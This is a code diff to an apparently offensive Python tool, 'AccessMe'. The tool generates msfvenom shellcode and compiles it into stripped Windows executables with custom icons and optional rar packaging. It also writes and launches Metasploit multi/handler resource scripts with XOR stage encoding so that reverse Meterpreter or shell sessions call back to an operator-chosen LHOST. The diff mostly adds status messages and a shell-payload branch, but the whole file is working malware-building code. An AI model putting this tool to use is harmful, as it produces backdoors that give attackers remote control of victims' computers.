@@ -1,4 +1,3 @@
-#Import
 from lib import core
 import random, string
 import subprocess, os
@@ -16,7 +15,7 @@ C_Extension = 'c'
 
 
 
-#Checking payload ARCH
+#Payload generator
 def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
 
     Gen_Payload = True
@@ -33,6 +32,11 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
 
 
@@ -45,6 +49,11 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
 
 
@@ -57,6 +66,11 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
 
 
@@ -68,6 +82,11 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
 
 
@@ -82,6 +101,11 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
 
 
@@ -94,6 +118,11 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
 
 
@@ -106,6 +135,11 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
 
 
@@ -117,7 +151,15 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
+
+                    core.Clear()
+
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Code generated." + core.amcolors.ENDC)
+
                     return SHELLCODE
+
+
+        Gen_Payload = False
 
 
 
@@ -153,7 +195,7 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
                     RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
                     subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compilation completed !\n" + core.amcolors.ENDC)
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compilation completed !\n" + core.amcolors.ENDC)
 
                     Compiler = False
 
@@ -163,9 +205,10 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
                     EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '-o', FILENAME, '-mwindows']
                     subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compilation completed !\n" + core.amcolors.ENDC)
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compilation completed !\n" + core.amcolors.ENDC)
 
                     Compiler = False
+
 
 
         elif ("x86") in ARCH:
@@ -193,7 +236,7 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
                     RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
                     subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compilation completed !\n" + core.amcolors.ENDC)
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compilation completed !\n" + core.amcolors.ENDC)
 
                     Compiler = False
 
@@ -206,7 +249,7 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
                     RM_SourceFile = ['rm', '/root/AccessMe/source.c']
                     subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compilation completed !\n" + core.amcolors.ENDC)
+                    print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compilation completed !\n" + core.amcolors.ENDC)
 
                     Compiler = False
 
@@ -238,19 +281,20 @@ def Auto_Executable_Strip(FILENAME, PLATFORM):
             EXE_STRIP = ['strip', '-s', FILENAME]
             subprocess.run(EXE_STRIP, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-            print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Strip completed !\n" + core.amcolors.ENDC)
+            print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Strip completed !\n" + core.amcolors.ENDC)
 
             Stripper = False
 
 
 
 def Compress_Rar(FILENAME):
+
     print("""
-     |--------------------------------|  
-     | Compress EXE to rar archive ?  |
-     | [0] Nope;                      |
-     | [1] Yeah;                      |
-     |--------------------------------|  
+ |--------------------------------|  
+ | Compress EXE to rar archive ?  |
+ | [0] Nope;                      |
+ | [1] Yeah;                      |
+ |--------------------------------|  
         """)
 
     CR = core.core_input()
@@ -268,7 +312,7 @@ def Compress_Rar(FILENAME):
 
             os.chdir("/root/AccessMe/output/")
 
-            print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Compression" + core.amcolors.ENDC)
+            print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Compression" + core.amcolors.ENDC)
 
             ARCHIVE = FILENAME.replace('.exe', '.rar')
             ARCHIVE = ARCHIVE.replace('/root/AccessMe/output/', '')
@@ -278,13 +322,17 @@ def Compress_Rar(FILENAME):
             COMPRESS = ['rar', 'a', '-m5', ARCHIVE, FILENAME]
             subprocess.run(COMPRESS, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-            print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compressed" + core.amcolors.ENDC)
+            print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compressed" + core.amcolors.ENDC)
 
             CRScript = False
 
 
+        else:
+            CRScript = False
 
-def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT):
+
+
+def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
     print("""
  |-----------------------------|  
@@ -309,72 +357,141 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT):
 
             if ("x64") in ARCH:
                 if ("Windows") in PLATFORM:
+                    if ("Meterpreter") in TYPE:
 
-                    LHOST = LHOST.replace('LHOST=', '')
-                    LPORT = LPORT.replace('LPORT=', '')
+                        LHOST = LHOST.replace('LHOST=', '')
+                        LPORT = LPORT.replace('LPORT=', '')
 
-                    RC_Meterpreter = "use exploit/multi/handler\n"
-                    RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
-                    RC_Meterpreter += "set lhost " + LHOST + "\n"
-                    RC_Meterpreter += "set lport " + LPORT + "\n"
-                    RC_Meterpreter += "set AutoLoadStdapi false\n"
-                    RC_Meterpreter += "set AutoSystemInfo false\n"
-                    RC_Meterpreter += "set EnableStageEncoding true\n"
-                    RC_Meterpreter += "set StageEncoder x64/xor_dynamic\n"
-                    RC_Meterpreter += "set ExitOnSession false\n"
-                    RC_Meterpreter += "exploit -j -z"
+                        RC_Meterpreter = "use exploit/multi/handler\n"
+                        RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
+                        RC_Meterpreter += "set lhost " + LHOST + "\n"
+                        RC_Meterpreter += "set lport " + LPORT + "\n"
+                        RC_Meterpreter += "set AutoLoadStdapi false\n"
+                        RC_Meterpreter += "set AutoSystemInfo false\n"
+                        RC_Meterpreter += "set EnableStageEncoding true\n"
+                        RC_Meterpreter += "set StageEncoder x64/xor_dynamic\n"
+                        RC_Meterpreter += "set ExitOnSession false\n"
+                        RC_Meterpreter += "exploit -j -z"
 
-                    with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
-                        f.write(RC_Meterpreter)
+                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                            f.write(RC_Meterpreter)
 
-                    os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
 
-                    core.Clear()
+                        core.Clear()
 
-                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
-                    time.sleep(30)
+                        print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
 
-                    RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
-                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        time.sleep(30)
 
-                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] RC file deleted." + core.amcolors.ENDC)
+                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RMScript = False
+                        print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
+
+                        RMScript = False
+
+
+                    elif ("Shell") in TYPE:
+
+                        LHOST = LHOST.replace('LHOST=', '')
+                        LPORT = LPORT.replace('LPORT=', '')
+
+                        RC_Meterpreter = "use exploit/multi/handler\n"
+                        RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
+                        RC_Meterpreter += "set lhost " + LHOST + "\n"
+                        RC_Meterpreter += "set lport " + LPORT + "\n"
+                        RC_Meterpreter += "set ExitOnSession false\n"
+                        RC_Meterpreter += "exploit -j -z"
+
+                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                            f.write(RC_Meterpreter)
+
+                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+
+                        core.Clear()
+
+                        print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
+
+                        time.sleep(30)
+
+                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                        print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
+
+                        RMScript = False
+
 
 
             elif ("x86") in ARCH:
                 if ("Windows") in PLATFORM:
+                    if ("Meterpreter") in TYPE:
 
-                    LHOST = LHOST.replace('LHOST=', '')
-                    LPORT = LPORT.replace('LPORT=', '')
+                        LHOST = LHOST.replace('LHOST=', '')
+                        LPORT = LPORT.replace('LPORT=', '')
 
-                    RC_Meterpreter = "use exploit/multi/handler\n"
-                    RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
-                    RC_Meterpreter += "set lhost " + LHOST + "\n"
-                    RC_Meterpreter += "set lport " + LPORT + "\n"
-                    RC_Meterpreter += "set AutoLoadStdapi false\n"
-                    RC_Meterpreter += "set AutoSystemInfo false\n"
-                    RC_Meterpreter += "set EnableStageEncoding true\n"
-                    RC_Meterpreter += "set StageEncoder x86/xor_dynamic\n"
-                    RC_Meterpreter += "set ExitOnSession false\n"
-                    RC_Meterpreter += "exploit -j -z"
+                        RC_Meterpreter = "use exploit/multi/handler\n"
+                        RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
+                        RC_Meterpreter += "set lhost " + LHOST + "\n"
+                        RC_Meterpreter += "set lport " + LPORT + "\n"
+                        RC_Meterpreter += "set AutoLoadStdapi false\n"
+                        RC_Meterpreter += "set AutoSystemInfo false\n"
+                        RC_Meterpreter += "set EnableStageEncoding true\n"
+                        RC_Meterpreter += "set StageEncoder x86/xor_dynamic\n"
+                        RC_Meterpreter += "set ExitOnSession false\n"
+                        RC_Meterpreter += "exploit -j -z"
 
-                    with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
-                        f.write(RC_Meterpreter)
+                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                            f.write(RC_Meterpreter)
 
-                    os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
 
-                    core.Clear()
+                        core.Clear()
 
-                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
-                    time.sleep(30)
+                        print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
+                        time.sleep(30)
 
-                    RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
-                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] RC file deleted." + core.amcolors.ENDC)
+                        print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
 
-                    RMScript = False
+                        RMScript = False
+
+
+                    elif ("Shell") in TYPE:
+
+                        LHOST = LHOST.replace('LHOST=', '')
+                        LPORT = LPORT.replace('LPORT=', '')
+
+                        RC_Meterpreter = "use exploit/multi/handler\n"
+                        RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
+                        RC_Meterpreter += "set lhost " + LHOST + "\n"
+                        RC_Meterpreter += "set lport " + LPORT + "\n"
+                        RC_Meterpreter += "set ExitOnSession false\n"
+                        RC_Meterpreter += "exploit -j -z"
+
+                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                            f.write(RC_Meterpreter)
+
+                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+
+                        core.Clear()
+
+                        print(
+                            core.amcolors.OCRA + core.amcolors.BOLD + " [*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
+
+                        time.sleep(30)
+
+                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                        print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
+
+                        RMScript = False
+
+
 
 
         else:
@@ -407,7 +524,7 @@ def Unnecessary_Characters(PAYLOAD):
 #Add LHOST param
 def LHOST_Input():
     LHOST = "LHOST="
-    LHOST += input(core.amcolors.BLUE + core.amcolors.BOLD + "Enter you LHOST : " + core.amcolors.ENDC)
+    LHOST += input(core.amcolors.BLUE + core.amcolors.BOLD + " Enter you LHOST : " + core.amcolors.ENDC)
     return  LHOST
 
 
@@ -415,12 +532,12 @@ def LHOST_Input():
 #Add LPORT param
 def LPORT_Input():
     LPORT = "LPORT="
-    LPORT += input(core.amcolors.BLUE + core.amcolors.BOLD + "Enter you LPORT : " + core.amcolors.ENDC)
+    LPORT += input(core.amcolors.BLUE + core.amcolors.BOLD + " Enter you LPORT : " + core.amcolors.ENDC)
     return LPORT
 
 
 
 def FILENAME_Input():
     FILENAME = ""
-    FILENAME += input(core.amcolors.BLUE + core.amcolors.BOLD + "Enter you FILENAME : " + core.amcolors.ENDC)
+    FILENAME += input(core.amcolors.BLUE + core.amcolors.BOLD + " Enter you FILENAME : " + core.amcolors.ENDC)
     return FILENAME
